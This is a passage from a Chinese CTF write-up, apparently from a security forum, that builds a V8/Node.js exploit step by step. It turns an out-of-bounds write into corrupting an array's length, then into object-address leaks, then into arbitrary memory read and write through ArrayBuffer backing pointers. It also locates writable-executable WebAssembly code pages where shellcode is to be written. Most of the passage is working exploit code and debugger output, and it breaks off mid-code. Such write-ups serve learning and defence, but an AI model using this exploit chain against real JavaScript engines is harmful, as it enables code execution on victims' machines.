有了前面前置知识的介绍，我们知道`bug_arr`数组元素位于`0x00001ca19adc6409-1`的位置:

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11|``` (gdb) x``/``20gx ``` ``` 0x000012b40ca867c9``-``1 ```<br><br>``` 0x12b40ca867c8``: ```    `0x00001cf6cec03539`    `0x0000000500000000`  ``` /``/ ``` `bug_arr FixedDoubleArray: pointer to` ``` Map``, length ```<br><br>``` 0x12b40ca867d8``: ```    `0x3ff199999999999a`    `0x400199999999999a`  ``` /``/ ``` `bug_arr FixedDoubleArray: element1` ``` 1.1``, element2 ``` `2.2`<br><br>``` 0x12b40ca867e8``: ```    `0x400a666666666666`    `0x401199999999999a`  ``` /``/ ``` `bug_arr FixedDoubleArray: element3` ``` 3.3``, element4 ``` `4.4`<br><br>``` 0x12b40ca867f8``: ```    `0x4016000000000000`    `0x00001cf6cec03539`  ``` /``/ ``` `bug_arr FixedDoubleArray: element5` `5.5`  `arr2: pointer to` `Map`<br><br>``` 0x12b40ca86808``: ```    `0x0000000300000000`    `0x401a666666666666`  ``` /``/ ``` `oob_arr FixedDoubleArray: length【越界读】, element1` `6.6`<br><br>``` 0x12b40ca86818``: ```    `0x401ecccccccccccd`    `0x402199999999999a`  ``` /``/ ``` `oob_arr FixedDoubleArray: element2` ``` 7.7``, element3 ``` `8.8`<br><br>``` 0x12b40ca86828``: ```    `0x00000034b0f02931`    `0x00001cf6cec02d29`  ``` /``/ ``` `oob_arr JSArray: pointer to` ``` map``, pointer to outline properties ```<br><br>``` 0x12b40ca86838``: ```    `0x000012b40ca86801`    `0x0000000300000000`  ``` /``/ ``` `oob_arr JSArray: pointer to elements, length`<br><br>``` 0x12b40ca86848``: ```    `0x00001cf6cec02641`    `0x0000000300000000`<br><br>``` 0x12b40ca86858``: ```    `0x00001cf6cec02641`    `0x0000000300000000`|

注意到`bug_arr`和`oob_arr`在内存中是彼此紧邻的，这样当`bug_arr`的长度为5，而我们获得的索引值是6时，就会读取到`bug_arr`数组末尾的第二个元素，也就是`oob_arr` FixedDoubleArray中的length属性。

而`oob_arr`的JSArray位于FixedDoubleArray的后面，我们需要覆盖更远的范围。

### [](https://bbs.kanxue.com/thread-270653.htm)4.3.4 覆写长度属性

根据上面的调试输出，要覆写的length属性距离`bug_arr`的起始元素的偏移为`bug_arr.length + 2 + oob_arr.length + 3`，必须合理设置代码中的数值，才能让程序正好覆盖到length属性上：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16|`function try2(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``]; ```<br><br>  `oob_arr` `=` ``` [``2.2``, ``` ``` 2.2``]; ```<br><br>  `let y` `=` `(x ?` `18014398509481984` `:` ``` 18014398509481978``) ```<br><br>  `y` `=` `y` `+` `2` `+` ``` 2``; ```<br><br>  `y` `=` `y` `-` ``` 18014398509481982``; ```  ``` /``/ ``` ``` 这里偏移是``6 ``` `或` `2`<br><br>  `y` `=` `y` `*` ``` 2``; ```  ``` /``/ ``` ``` *``2 ``` ``` 偏移是``12 ``` `或` `4`<br><br>  `let v` `=` `bug_arr[y];` <br><br>  `bug_arr[y]` `=` ``` i2f(``0x0000006400000000``); ```<br><br>  `if` `(x) {`<br><br>    `output(y, v, bug_arr);`<br><br>    ``` %``DebugPrint(bug_arr); ```<br><br>    ``` %``DebugPrint(oob_arr); ```<br><br>  `}`<br><br>  `return` `v;`<br><br>`}`|

得到输出结果：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6|`Index` `is` `12`<br><br>`Array length` `is` `5`<br><br>`Value` `is` `0000000200000000`<br><br>`0x3ee7696bcab1` ``` <JSArray[``5``]> ```<br><br>`0x096c273bee59` ``` <JSArray[``100``]> ```<br><br>``` 4.243991582e``-``314 ```|

注意到`oob_arr`的长度已经变成了100。现在我们可以很方便的通过`oob_arr`索引后面的数据了。

## [](https://bbs.kanxue.com/thread-270653.htm)4.4 获取对象地址的能力

正如之前所说，只要把对象放在oob_arr数组后面，就可以通过漏洞获取到该对象的地址。为了方便定位，我们在对象前面放置一个MARKER，两者组合放在一个数组中。

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25|`let OOB_LENGTH_64` `=` ``` 0x0000006400000000``; ```<br><br>`let MARKER1` `=` ``` 0x11``; ```<br><br>`let MARKER1_64` `=` ``` 0x0000001100000000``; ```<br><br>`function try2(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``]; ```<br><br>  `oob_arr` `=` ``` [``2.2``, ``` ``` 2.2``]; ```<br><br>  `obj_arr` `=` `[MARKER1, Math];`  ``` /``/ ``` `假设想要得到地址的对象是Math`<br><br>  ``` /``/ ``` `overwrite the length of oob_arr`<br><br>  `let y` `=` `(x ?` `18014398509481984` `:` ``` 18014398509481978``) ```<br><br>  `y` `=` `y` `+` `2` `+` ``` 2``; ```<br><br>  `y` `=` `y` `-` ``` 18014398509481982``; ```<br><br>  `y` `=` `y` `*` ``` 2``; ```<br><br>  `let v` `=` `bug_arr[y];` <br><br>  `bug_arr[y]` `=` `i2f(OOB_LENGTH_64);`<br><br>  `if` `(x) {`<br><br>    `let addr_idx` `=` `oob_arr.indexOf(i2f(MARKER1_64))` `+` ``` 1``; ```<br><br>    `let obj_addr` `=` `f2i(oob_arr[addr_idx])` `-` ``` 1n``; ```<br><br>    `console.log(tohex(obj_addr));`<br><br>    ``` %``DebugPrint(obj_arr); ```<br><br>  `}`<br><br>  `return` `v;`<br><br>`}`|

得到输出：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4|``` test@test``-``vm:~``/``ctf2018$ node ``` ``` -``-``allow``-``natives``-``syntax try2.js ``` <br><br>`0000356298e93df0`<br><br>`0x3d07774cffe1` ``` <JSArray[``2``]> ```<br><br>``` 4.243991582e``-``314 ```|

通过调试查看其内存：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6|``` (gdb) x``/``4gx ``` `0x3d07774cffe0`<br><br>``` 0x3d07774cffe0``: ```    `0x00000fddef0029d1`    `0x0000278ca0902d29`<br><br>``` 0x3d07774cfff0``: ```    `0x00003d07774cffc1`    `0x0000000200000000`<br><br>``` (gdb) x``/``4gx ``` `0x00003d07774cffc0`<br><br>``` 0x3d07774cffc0``: ```    `0x0000278ca09028b9`    `0x0000000200000000`<br><br>``` 0x3d07774cffd0``: ```    `0x0000001100000000`    `0x0000356298e93df1`|

可以看到这段代码确实输出了对象的地址`0x0000356298e93df1 - 1`

## [](https://bbs.kanxue.com/thread-270653.htm)4.5 任意地址读写的能力

前面说过了，这个能力需要在oob_arr后面放一个指针，然后通过修改指针来实现“任意地址”读写的功能。理论上来说，指针的实现可以通过各种数组实现，因为它们在偏移0x10的位置都有一个Pointer to Elements。但是这里我们选择ArrayBuffer，因为它有backing pointer，这个指针指向的内存是纯二进制数据，可以按照各种数据形式进行访问，十分方便。

我们可以通过`oob_arr[idx]`把可执行内存的地址赋值给backing pointer，然后再利用typed array objects访问backing pointer指向的内存，按照自己想要的格式写入shellcode。

代码如下：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32<br><br>33<br><br>34<br><br>35<br><br>36<br><br>37|`let AB_LENGTH` `=` ``` 0x100``; ```<br><br>`let AB_LENGTH_64` `=` ``` 0x0000010000000000``; ``` <br><br>`let OOB_LENGTH_64` `=` ``` 0x0000006400000000``; ```<br><br>`let MARKER1` `=` ``` 0x11``; ```<br><br>`let MARKER1_64` `=` ``` 0x0000001100000000``; ```<br><br>`function try2(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``]; ```<br><br>  `oob_arr` `=` ``` [``2.2``, ``` ``` 2.2``]; ```<br><br>  `obj_arr` `=` `[MARKER1, Math];`<br><br>  `buf_arr` `=` `new ArrayBuffer(AB_LENGTH);`<br><br>  ``` /``/ ``` `overwrite the length of oob_arr`<br><br>  `let y` `=` `(x ?` `18014398509481984` `:` ``` 18014398509481978``) ```<br><br>  `y` `=` `y` `+` `2` `+` ``` 2``; ```<br><br>  `y` `=` `y` `-` ``` 18014398509481982``; ```<br><br>  `y` `=` `y` `*` ``` 2``; ```<br><br>  `let v` `=` `bug_arr[y];` <br><br>  `bug_arr[y]` `=` `i2f(OOB_LENGTH_64);`<br><br>  `if` `(x) {`<br><br>    `let addr_idx` `=` `oob_arr.indexOf(i2f(MARKER1_64))` `+` ``` 1``; ```<br><br>    `let bp_idx` `=` `oob_arr.indexOf(i2f(AB_LENGTH_64))` `+` ``` 1``; ```<br><br>    `let obj_addr` `=` `oob_arr[addr_idx];`<br><br>    `oob_arr[bp_idx]` `=` `obj_addr;`  ``` /``/ ``` ``` 修改backing pointer，设置想要读``/``写的地址 ```<br><br>    ``` /``/ ``` ``` 以uint64的格式读``/``写地址 ```<br><br>    `let view` `=` `new BigUint64Array(buf_arr);`<br><br>    ``` /``/ ``` ``` 写入的地址是obj_addr，首位应该是``map``，这里对其进行篡改 ```<br><br>    ``` view[``0``] ``` `=` ``` 0x4141414141414141n``; ```<br><br>    ``` %``DebugPrint(obj_arr); ```<br><br>    ``` %``DebugPrint(obj_arr[``1``]); ```<br><br>  `}`<br><br>  `return` `v;`<br><br>`}`|

得到输出：

|   |   |
|---|---|
|1<br><br>2<br><br>3|``` test@test``-``vm:~``/``ctf2018$ node ``` ``` -``-``allow``-``natives``-``syntax try2.js ``` <br><br>`0x1f1c989d0669` ``` <JSArray[``2``]> ```<br><br>`0x18d4029d06e9` `Segmentation fault (core dumped)`|

由于对Math对象的map进行了篡改，修改成了非法的值，因此引用的时候发生了错误。

在调试器中查看内存：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9|``` (gdb) x``/``4gx ``` `0x1f1c989d0668`<br><br>``` 0x1f1c989d0668``: ```    `0x000012eb4c5829d1`    `0x00001fc855802d29`<br><br>``` 0x1f1c989d0678``: ```    `0x00001f1c989d0649`    `0x0000000200000000`<br><br>``` (gdb) x``/``4gx ``` `0x00001f1c989d0648`<br><br>``` 0x1f1c989d0648``: ```    `0x00001fc8558028b9`    `0x0000000200000000`<br><br>``` 0x1f1c989d0658``: ```    `0x0000001100000000`    `0x000007bfc3593df1`<br><br>``` (gdb) x``/``4gx ``` `0x000007bfc3593df1`<br><br>``` 0x7bfc3593df1``: ```    `0x4141414141414141`    `0x29000007bfc35949`<br><br>``` 0x7bfc3593e01``: ```    `0x6900001fc855802d`    `0x164005bf0a8b1457`|

可以看到位于`obj_arr[1]`的对象地址`0x000007bfc3593df1`所指向的内存，首位确实被修改成了`0x4141414141414141`。

## [](https://bbs.kanxue.com/thread-270653.htm)4.6 利用WebAssembly获取可执行内存地址

### [](https://bbs.kanxue.com/thread-270653.htm)4.6.1 获取WebAssembly编译后函数

到目前为止我们已经具有了获取对象地址以及向任意地址写数据的能力，接下来需要确定的是向哪里写数据。

根据参考资料8，v8的JIT代码页有一个写保护，它会根据标志位在RW和RX权限之间转换，因此无法用shellcode覆盖已编译的函数代码页。

但是除了javascript之外，v8还会编译WebAssembly，而它的代码页的写保护默认是关闭的，因此已编译的WebAssembly代码页具有RWX权限。

参考资料10提供了[一个网页](https://wasdk.github.io/WasmFiddle/)，可以把你编写的C语言代码转换为WebAssembly，生成对应的二进制文件，并提供了加载执行这段二进制代码的方法：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6|``` /``/ ``` `这里保存二进制代码`<br><br>`var wasm_code` `=` ``` new Uint8Array([``0``,``97``,``115``,``109``,``1``,``0``,``0``,``0``,``1``,``133``,``128``,``128``,``128``,``0``,``1``,``96``,``0``,``1``,``127``,``3``,``130``,``128``,``128``,``128``,``0``,``1``,``0``,``4``,``132``,``128``,``128``,``128``,``0``,``1``,``112``,``0``,``0``,``5``,``131``,``128``,``128``,``128``,``0``,``1``,``0``,``1``,``6``,``129``,``128``,``128``,``128``,``0``,``0``,``7``,``145``,``128``,``128``,``128``,``0``,``2``,``6``,``109``,``101``,``109``,``111``,``114``,``121``,``2``,``0``,``4``,``109``,``97``,``105``,``110``,``0``,``0``,``10``,``138``,``128``,``128``,``128``,``0``,``1``,``132``,``128``,``128``,``128``,``0``,``0``,``65``,``42``,``11``]); ```<br><br>``` /``/ ``` `下面进行加载`<br><br>`var wasm_mod` `=` `new WebAssembly.Module(wasm_code);`<br><br>`var wasm_instance` `=` `new WebAssembly.Instance(wasm_mod);`<br><br>`var f` `=` `wasm_instance.exports.main;`|

### [](https://bbs.kanxue.com/thread-270653.htm)4.6.2 分析源码得到jump table所在偏移

但是我们想要的可执行内存并不是f的地址，按照参考资料8，它的结构是这样的：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6|`-` `JSFunction` ``` -``> ```<br><br>  `-` `SharedFunctionInfo pointer` ``` -``> ```<br><br>    `-` `(WasmExportedFunctionData)function data pointer` ``` -``> ```<br><br>      `-` `WasmInstanceObject pointer` ``` -``> ``` <br><br>        `-` `jump table start address`<br><br>      `-` `function index`|

之后`jump table start + function index`就会到达这个函数的jump table entry，它指向的就是RWX的内存，也是这个函数的入口点。

由于我们这里只有一个函数，因此只要获得jump table start address就可以了，它的首位就保存了函数的入口点，也就是可执行内存的地址。

参考资料2就是预先确定了这几个位置的偏移，然后不断地读取数据，最终得到可执行内存的地址；而参考资料10直接通过WasmInstanceObject pointer获得jump table start address。

上面所示结构以及各个数据的偏移（首位偏移为0）可以这样得到：

首先是一些头部信息大小：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14|``` /``/ ``` ``` node``/``v8``/``src``/``objects.h ```<br><br>``` /``/ ``` ``` Object``::kHeaderSize ``` `=` `0`<br><br>`static const` `int` `kHeaderSize` `=` ``` 0``; ```<br><br>``` /``/ ``` `HeapObject::kHeaderSize` `=` `8`<br><br>`static const` `int` `kMapOffset` `=` ``` Object``::kHeaderSize; ```<br><br>`static const` `int` `kHeaderSize` `=` `kMapOffset` `+` `kPointerSize;`<br><br>``` /``/ ``` `JSReceiver::kHeaderSize` `=` `16`<br><br>`static const` `int` `kHeaderSize` `=` `HeapObject::kHeaderSize` `+` `kPointerSize;`<br><br>``` /``/ ``` `JSObject::kHeaderSize` `=` `24`<br><br>`static const` `int` `kElementsOffset` `=` `JSReceiver::kHeaderSize;`<br><br>`static const` `int` `kHeaderSize` `=` `kElementsOffset` `+` `kPointerSize;`|

然后从`JS_FUNCTION`结构开始看：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8|``` /``/ ``` ``` node``/``v8``/``src``/``objects.h ```<br><br>`#define JS_FUNCTION_FIELDS(V)                              \`<br><br>  ``` /``* ``` `Pointer fields.` ``` *``/ ```                                    `\`<br><br>  `V(kSharedFunctionInfoOffset, kPointerSize)               \`<br><br>  `V(kContextOffset, kPointerSize)                          \`<br><br>  `...`<br><br>  `DEFINE_FIELD_OFFSET_CONSTANTS(JSObject::kHeaderSize, JS_FUNCTION_FIELDS)`<br><br>`#undef JS_FUNCTION_FIELDS`|

可以看到`kSharedFunctionInfoOffset`在首位，再加上前面的`JSObject::kHeaderSize`，`kSharedFunctionInfoOffset`的偏移是3。

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9|``` /``/ ``` ``` /``node``/``v8``/``src``/``objects``/``shared``-``function``-``info.h ```<br><br>`#define SHARED_FUNCTION_INFO_FIELDS(V)                     \`<br><br>  ``` /``* ``` `Pointer fields.` ``` *``/ ```                                    `\`<br><br>  `V(kStartOfPointerFieldsOffset,` ``` 0``)                        \ ```<br><br>  `V(kFunctionDataOffset, kPointerSize)                     \`<br><br>  `...`<br><br>  `DEFINE_FIELD_OFFSET_CONSTANTS(HeapObject::kHeaderSize,`<br><br>                                `SHARED_FUNCTION_INFO_FIELDS)`<br><br>`#undef SHARED_FUNCTION_INFO_FIELDS`|

`kFunctionDataOffset`在第二位，但是第一位的大小是0，所以实际应该是在第一位，再加上前面的`HeapObject::kHeaderSize`，`kFunctionDataOffset`的偏移是1。

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10|``` /``/ ``` ``` /``node``/``v8``/``src``/``wasm``/``wasm``-``objects.h ```<br><br>`#define WASM_EXPORTED_FUNCTION_DATA_FIELDS(V)       \`<br><br>  `V(kWrapperCodeOffset, kPointerSize)               \`<br><br>  `V(kInstanceOffset, kPointerSize)                  \`<br><br>  `V(kJumpTableOffsetOffset, kPointerSize)` ``` /``* ``` `Smi` ``` *``/ ``` `\`<br><br>  `V(kFunctionIndexOffset, kPointerSize)`   ``` /``* ``` `Smi` ``` *``/ ``` `\`<br><br>  `V(kSize,` ``` 0``) ```<br><br>  `DEFINE_FIELD_OFFSET_CONSTANTS(HeapObject::kHeaderSize,`<br><br>                                `WASM_EXPORTED_FUNCTION_DATA_FIELDS)`<br><br>`#undef WASM_EXPORTED_FUNCTION_DATA_FIELDS`|

`kInstanceOffset`在第二位，再加上前面的`HeapObject::kHeaderSize`，`kInstanceOffset`的偏移是2。

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17|``` /``/ ``` ``` /``node``/``v8``/``src``/``wasm``/``wasm``-``objects.h ```<br><br>`#define WASM_INSTANCE_OBJECT_FIELDS(V)                                  \`<br><br>  `...` ``` /``/ ``` ``` 省略了``15``行 ```<br><br>  `V(kFirstUntaggedOffset,` ``` 0``) ```                             ``` /``* ``` `marker` ``` *``/ ```   `\`<br><br>  `V(kMemoryStartOffset, kPointerSize)`                    ``` /``* ``` `untagged` ``` *``/ ``` `\`<br><br>  `V(kMemorySizeOffset, kSizetSize)`                       ``` /``* ``` `untagged` ``` *``/ ``` `\`<br><br>  `V(kMemoryMaskOffset, kSizetSize)`                       ``` /``* ``` `untagged` ``` *``/ ``` `\`<br><br>  `...` ``` /``/ ``` ``` 省略了``8``行 ```<br><br>  `V(kJumpTableStartOffset, kPointerSize)`                 ``` /``* ``` `untagged` ``` *``/ ``` `\`<br><br>  `V(kIndirectFunctionTableSizeOffset, kUInt32Size)`       ``` /``* ``` `untagged` ``` *``/ ``` `\`<br><br>  `V(k64BitArchPaddingOffset, kPointerSize` `-` `kUInt32Size)` ``` /``* ``` `padding` ``` *``/ ```  `\`<br><br>  `V(kSize,` ``` 0``) ```<br><br>  `DEFINE_FIELD_OFFSET_CONSTANTS(JSObject::kHeaderSize,`<br><br>                                `WASM_INSTANCE_OBJECT_FIELDS)`<br><br>`#undef WASM_INSTANCE_OBJECT_FIELDS`<br><br>``` /``/ ``` ``` /``node``/``v8``/``src``/``globals``.h ```<br><br>`constexpr` `int` `kSizetSize` `=` `sizeof(size_t);`|

`kJumpTableStartOffset`在第28位，因为前面有一个大小为0，所以实际上是在第27位，再加上前面的`JSObject::kHeaderSize`，`kJumpTableStartOffset`的偏移是29。

整理偏移值得到：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4|`kSharedFunctionInfoOffset:` `3`<br><br>`kFunctionDataOffset:` `1`<br><br>`kInstanceOffset:` `2`<br><br>`kJumpTableStartOffset:` `29`|

### [](https://bbs.kanxue.com/thread-270653.htm)4.6.3 偏移值验证

代码：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8|`var wasm_code` `=` ``` new Uint8Array([``0``,``97``,``115``,``109``,``1``,``0``,``0``,``0``,``1``,``133``,``128``,``128``,``128``,``0``,``1``,``96``,``0``,``1``,``127``,``3``,``130``,``128``,``128``,``128``,``0``,``1``,``0``,``4``,``132``,``128``,``128``,``128``,``0``,``1``,``112``,``0``,``0``,``5``,``131``,``128``,``128``,``128``,``0``,``1``,``0``,``1``,``6``,``129``,``128``,``128``,``128``,``0``,``0``,``7``,``145``,``128``,``128``,``128``,``0``,``2``,``6``,``109``,``101``,``109``,``111``,``114``,``121``,``2``,``0``,``4``,``109``,``97``,``105``,``110``,``0``,``0``,``10``,``138``,``128``,``128``,``128``,``0``,``1``,``132``,``128``,``128``,``128``,``0``,``0``,``65``,``42``,``11``]); ```<br><br>`var wasm_mod` `=` `new WebAssembly.Module(wasm_code);`<br><br>`var wasm_instance` `=` `new WebAssembly.Instance(wasm_mod);`<br><br>`var f` `=` `wasm_instance.exports.main;`<br><br>``` %``DebugPrint(f); ```<br><br>``` while``(``1``) {} ```|

得到输出：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15|``` test@test``-``vm:~``/``ctf2018$ node_debug ``` ``` -``-``allow``-``natives``-``syntax wasm_test.js ``` <br><br>`DebugPrint:` ``` 0x15e5d1c8141``: [Function] ``` `in` `OldSpace`<br><br> `-` ``` map``: ``` `0x27335a1062b1` ``` <``Map``(HOLEY_ELEMENTS)> [FastProperties] ```<br><br> `-` `prototype:` `0x392436f04669` `<JSFunction (sfi` `=` ``` 0x205dbb084df1``)> ```<br><br> `-` `elements:` `0x22c411e02d29` ``` <FixedArray[``0``]> [HOLEY_ELEMENTS] ```<br><br> `-` ``` function prototype: <no``-``prototype``-``slot> ```<br><br> `-` `shared_info:` `0x015e5d1c8109` `<SharedFunctionInfo` ``` 0``> ```<br><br> `-` `name:` `0x22c411e08691` ``` <String[``1``]: ``` ``` 0``> ```<br><br> `-` `formal_parameter_count:` `0`<br><br> `-` `kind: NormalFunction`<br><br> `-` `context:` `0x392436f03da1` ``` <NativeContext[``252``]> ```<br><br> `-` `code:` `0x2ce1fe39bce1` `<Code JS_TO_WASM_FUNCTION>`<br><br> `-` `WASM instance` `0x15e5d1c7f69`<br><br> `-` `WASM function index` `0`<br><br>`...`|

在调试器中查看`0x15e5d1c8141`内存，并根据前面得到的偏移值跟随验证：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26|``` (gdb) x``/``4gx ``` `0x15e5d1c8140`   ``` /``/ ``` `JS_FUNCTION`<br><br>``` 0x15e5d1c8140``: ```    `0x000027335a1062b1`    `0x000022c411e02d29`<br><br>``` 0x15e5d1c8150``: ```    `0x000022c411e02d29`    `0x0000015e5d1c8109`<br><br>``` (gdb) x``/``2gx ``` `0x0000015e5d1c8108`  ``` /``/ ``` `SharedFunctionInfo`<br><br>``` 0x15e5d1c8108``: ```    `0x000022c411e02a99`    `0x0000015e5d1c80e1`<br><br>``` (gdb) x``/``3gx ``` `0x0000015e5d1c80e0`  ``` /``/ ``` `FunctionData`<br><br>``` 0x15e5d1c80e0``: ```    `0x000022c411e09479`    `0x00002ce1fe39bce1`<br><br>``` 0x15e5d1c80f0``: ```    `0x0000015e5d1c7f69`   <br><br>``` (gdb) x``/``30gx ``` `0x0000015e5d1c7f68`  ``` /``/ ``` `Instance`<br><br>``` 0x15e5d1c7f68``: ```    `0x000027335a108421`    `0x000022c411e02d29`<br><br>``` 0x15e5d1c7f78``: ```    `0x000022c411e02d29`    `0x00002dd2cf94e189`<br><br>``` 0x15e5d1c7f88``: ```    `0x00002dd2cf94e371`    `0x0000392436f03da1`<br><br>``` 0x15e5d1c7f98``: ```    `0x0000015e5d1c8061`    `0x000022c411e025b1`<br><br>``` 0x15e5d1c7fa8``: ```    `0x000022c411e025b1`    `0x000022c411e025b1`<br><br>``` 0x15e5d1c7fb8``: ```    `0x000022c411e025b1`    `0x000022c411e02d29`<br><br>``` 0x15e5d1c7fc8``: ```    `0x000022c411e02d29`    `0x000022c411e025b1`<br><br>``` 0x15e5d1c7fd8``: ```    `0x00002dd2cf94e301`    `0x000022c411e025b1`<br><br>``` 0x15e5d1c7fe8``: ```    `0x000022c411e022a1`    `0x00002ce1fe068ae1`<br><br>``` 0x15e5d1c7ff8``: ```    `0x00007f8e90000000`    `0x0000000000010000`<br><br>``` 0x15e5d1c8008``: ```    `0x000000000000ffff`    `0x000055f2affd67f8`<br><br>``` 0x15e5d1c8018``: ```    `0x000055f2affdd938`    `0x000055f2affdd928`<br><br>``` 0x15e5d1c8028``: ```    `0x000055f2b007f6c0`    `0x0000000000000000`<br><br>``` 0x15e5d1c8038``: ```    `0x000055f2b007f6e0`    `0x0000000000000000`<br><br>``` 0x15e5d1c8048``: ```    `0x0000000000000000`    `0x00001b3e42795000`<br><br>``` (gdb) x``/``1gx ``` `0x00001b3e42795000`  ``` /``/ ``` `JumpTableStart`<br><br>``` 0x1b3e42795000``: ```    `0x1b3e427954a0ba49`|

可以看到最终得到的数值`0x00001b3e42795000`确实是一个4KB对齐的地址。

### [](https://bbs.kanxue.com/thread-270653.htm)4.6.4 获得可执行内存的代码

我在最初实验的时候，还没有认真进行上面的分析，只是按照参考资料10的方法，先通过`%DebugPrint`输出`WasmInstanceObject`的地址，然后在调试器中查看其后的大片内存，找到4KB对齐的地址(十六进制时低三位均为0)所在的偏移，然后直接确定了jump table start address。

代码如下：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10<br><br>11<br><br>12<br><br>13<br><br>14<br><br>15<br><br>16<br><br>17<br><br>18<br><br>19<br><br>20<br><br>21<br><br>22<br><br>23<br><br>24<br><br>25<br><br>26<br><br>27<br><br>28<br><br>29<br><br>30<br><br>31<br><br>32<br><br>33<br><br>34<br><br>35<br><br>36<br><br>37<br><br>38<br><br>39<br><br>40<br><br>41<br><br>42<br><br>43<br><br>44|`let AB_LENGTH` `=` ``` 0x100``; ```<br><br>`let AB_LENGTH_64` `=` ``` 0x0000010000000000``; ``` <br><br>`let OOB_LENGTH_64` `=` ``` 0x0000006400000000``; ```<br><br>`let MARKER1` `=` ``` 0x11``; ```<br><br>`let MARKER1_64` `=` ``` 0x0000001100000000``; ```<br><br>`function try2(x) {`<br><br>  `let bug_arr` `=` ``` [``1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``, ``` ``` 1.1``]; ```<br><br>  `oob_arr` `=` ``` [``2.2``, ``` ``` 2.2``]; ```<br><br>  `obj_arr` `=` `[MARKER1, Math];`<br><br>  `buf_arr` `=` `new ArrayBuffer(AB_LENGTH);`<br><br>  ``` /``/ ``` `overwrite the length of oob_arr`<br><br>  `let y` `=` `(x ?` `18014398509481984` `:` ``` 18014398509481978``) ```<br><br>  `y` `=` `y` `+` `2` `+` ``` 2``; ```<br><br>  `y` `=` `y` `-` ``` 18014398509481982``; ```<br><br>  `y` `=` `y` `*` ``` 2``; ```<br><br>  `let v` `=` `bug_arr[y];` <br><br>  `bug_arr[y]` `=` `i2f(OOB_LENGTH_64);`<br><br>  `if` `(x) {`<br><br>    `let addr_idx` `=` `oob_arr.indexOf(i2f(MARKER1_64))` `+` ``` 1``; ```<br><br>    `let bp_idx` `=` `oob_arr.indexOf(i2f(AB_LENGTH_64))` `+` ``` 1``; ```<br><br>    `var wasm_code` `=` ``` new Uint8Array([``0``,``97``,``115``,``109``,``1``,``0``,``0``,``0``,``1``,``133``,``128``,``128``,``128``,``0``,``1``,``96``,``0``,``1``,``127``,``3``,``130``,``128``,``128``,``128``,``0``,``1``,``0``,``4``,``132``,``128``,``128``,``128``,``0``,``1``,``112``,``0``,``0``,``5``,``131``,``128``,``128``,``128``,``0``,``1``,``0``,``1``,``6``,``129``,``128``,``128``,``128``,``0``,``0``,``7``,``145``,``128``,``128``,``128``,``0``,``2``,``6``,``109``,``101``,``109``,``111``,``114``,``121``,``2``,``0``,``4``,``109``,``97``,``105``,``110``,``0``,``0``,``10``,``138``,``128``,``128``,``128``,``0``,``1``,``132``,``128``,``128``,``128``,``0``,``0``,``65``,``42``,``11``]); ```<br><br>    `var wasm_mod` `=` `new WebAssembly.Module(wasm_code);`<br><br>    `var wasm_instance` `=` `new WebAssembly.Instance(wasm_mod);`<br><br>    `var f` `=` `wasm_instance.exports.main;`<br><br>    ``` /``/ ``` `get address of wasm_instance`<br><br>    ``` obj_arr[``1``] ``` `=` `wasm_instance;`<br><br>    `let wasm_instance_addr` `=` 